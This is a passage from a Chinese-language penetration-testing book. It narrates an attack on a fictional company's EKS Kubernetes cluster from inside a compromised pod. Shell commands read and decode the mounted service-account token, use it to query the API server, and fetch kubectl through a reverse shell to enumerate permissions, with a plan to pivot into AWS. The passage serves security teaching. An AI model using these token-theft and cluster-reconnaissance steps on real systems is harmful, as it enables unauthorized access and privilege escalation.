
`name: cluster-admin` # default role with all privileges

`apiGroup: ""`

```
列表 8-2：ClusterRoleBinding 清单文件
```

管理员若想将服务账户分配给普通 pod，可添加单个属性 `serviceAccountName`，如下：

```
apiVersion: v1

kind: Pod  # We want to deploy a Pod

metadata:

--snip--

spec:

  containers:

    serviceAccountName: metrics-ro

    - name: nginx  # First container

--snip--
```

之前我们未提供任何身份验证就访问了 API 服务器，因此被分配了默认的 `system:anonymous` 用户，该用户没有任何权限。这阻止了我们访问 API 服务器。常识会认为，缺少 `serviceAccountName` 属性的容器也会继承相同的匿名账户状态。

这似乎合理，但 Kube 的运作不同。每个没有服务账户的 pod 都会自动分配 `system:serviceaccount:default:default` 账户。注意“anonymous”与“default”的细微差别。Default 看起来比 anonymous 更不危险，更值得信任，甚至在容器内部挂载了身份验证令牌！

我们搜索容器默认挂载的服务账户：

```
shell> mount |grep -i secrets

tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)

shell> cat /run/secrets/kubernetes.io/serviceaccount/token

eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwnJI5Y2FmZGRi...
```

该账户令牌实际上是一个签名的 JavaScript Object Notation（JSON）字符串，也称为 JSON Web Token（JWT），其中包含标识服务账户的信息。我们可对 JWT 字符串的一部分进行 base64 解码，以确认默认服务账户的身份并获取信息：

```
shell> cat /run/secrets/kubernetes.io/serviceaccount/token \
| cut -d "." -f 2 \
| base64 -d

{
"iss": "kubernetes/serviceaccount",
"kubernetes.io/serviceaccount/namespace": "prod",
"kubernetes.io/serviceaccount/secret.name": "default-token-2mpcg",
"kubernetes.io/serviceaccount/service-account.name": "default",
"kubernetes.io/serviceaccount/service-account.uid": "956f6a5d-0854-11ea-9d5f-06c16d8c2dcc",
"sub": "system:serviceaccount:prod:default"
}
```

JWT 有几个常规字段，也称注册声明：发行者 `iss`，此处为 Kubernetes 服务账户控制器；主题 `sub`，即账户名称；以及命名空间，稍后详述，此处为 `prod`。显然，若不使附加到此 JSON 文件的签名失效，我们无法更改此信息来冒充其他账户。

命名空间是逻辑分区，用于分隔 pod、服务账户、secret 等 Kube 资源组，通常由管理员设置。它是一个软性屏障，允许更细粒度的 RBAC 权限；例如，具有“列出所有 pod”权限的角色仅限于列出其命名空间内的 pod。默认服务账户也依赖命名空间。我们刚检索到的账户规范名称为 `system:serviceaccount:prod:default`。

> NOTE 我将命名空间描述为“软”隔离方案，因为节点不受命名空间约束。管理员始终可要求 `kube-scheduler` 仅将给定命名空间的 pod 分配给具有特定标签或注释的节点，但许多人认为这违背了 Kubernetes 的初衷。此外，集群内部的所有网络流量默认都会被路由，而与命名空间无关。

此令牌给了我们再次查询 API 服务器的机会。我们将文件内容加载到 `TOKEN` 变量中，并重试列表 8-1 中的第一次 HTTP 请求，将 `TOKEN` 变量作为 `Authorization` 头发送：

```
shell> export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

shell> curl -Lk https://10.100.0.1/api --header "Authorization: Bearer $TOKEN"
```

```
"kind": "APIVersions",
"versions": ["v1"],
"serverAddressByClientCIDRs": [{
"clientCIDR": "0.0.0.0/0",
"serverAddress": "ip-10-0-34-162.eu-west-1.compute.internal:443"
}]
```

哎呀！看起来默认服务账号确实比匿名账号拥有更多权限。我们已经成功在集群内部获取了一个有效的身份。

## Recon 2.0

是时候进行一些侦察了。我们下载了 `https://10.100.0.1/openapi/v2` 端点上可用的 API 规范并探索我们的选项。

我们首先获取集群的 `/version` 端点。如果集群足够旧，可能存在利用公开漏洞提升权限的可能性：

```
shell> curl -Lk https://10.100.0.1/version --header "Authorization: Bearer $TOKEN"

{
  "major": "1",
  "minor": "14+",
  "gitVersion": "v1.14.6-eks-5047ed",
  "buildDate": "2019-08-21T22:32:40Z",
  "goVersion": "go1.12.9",
  --snip--
}
```

MXR Ads 运行的是由 Elastic Kubernetes Service（EKS）支持的 Kubernetes 1.14，EKS 是 AWS 管理的 Kubernetes 版本。在此设置中，AWS 在其自己的主节点池上托管 API 服务器、etcd 和其他控制器，也称为控制平面。客户（本例中为 MXR Ads）仅托管工作节点（数据平面）。

这是一个重要的信息，因为 AWS 的 Kube 版本允许 IAM 角色与服务账号之间建立比自托管版本更强的绑定。如果我们攻破正确的 Pod 并获取令牌，我们不仅可以攻击 Kube 集群，还可以攻击 AWS 资源！

我们继续探索，通过尝试从我们检索到的 OpenAPI 文档中的多个 API 端点。我们尝试 `api/v1/namespaces/default/secrets/`、`api/v1/namespaces/default/serviceaccounts` 以及许多其他对应 Kube 资源的端点，但我们反复被 401 错误消息阻止。如果我们继续这样下去，错误率会引起不必要的注意。幸运的是，有一个名为 `/apis/authorization.k8s.io/v1/selfsubjectaccessreview` 的 Kube API，可以立即告诉我们是否可以在给定对象上执行操作。

手动通过 `curl` 查询调用它很麻烦，因为这需要一个冗长且丑陋的 JSON 负载，所以我们通过反向 shell 下载 Kubectl 程序。这次我们不需要设置配置文件，因为 Kubectl 会自动发现集群注入的环境变量，从挂载的目录加载当前令牌，并且可以立即 100% 正常运行。在这里我们下载 Kubectl 二进制文件，使其可执行，并再次检索集群版本：

```
shell> wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl

shell> chmod +x kubectl && ./kubectl version

Server Version: version.Info {Major:"1", Minor:"14+", GitVersion:"v1.14.6-eks-5047ed"...
```

完美！一切都运行良好。现在我们反复对最常见的指令调用 `auth can-i` 命令——`get pods`、`get services`、`get roles`、`get secrets` 等——以充分探索分配给我们正在操作的此默认令牌的所有权限：
